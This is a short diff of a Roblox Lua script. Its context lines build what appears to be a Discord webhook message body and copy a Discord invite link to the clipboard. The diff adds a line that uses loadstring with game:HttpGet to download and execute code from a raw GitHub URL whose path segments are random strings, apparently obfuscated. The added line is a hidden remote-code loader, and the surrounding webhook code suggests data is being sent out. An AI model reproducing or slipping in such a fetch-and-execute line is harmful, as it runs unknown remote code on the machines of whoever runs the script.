@@ -43,4 +43,6 @@
          };
          Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
         }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/qLMu9tYUMfI8s8m9MtYUMuG"))()
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
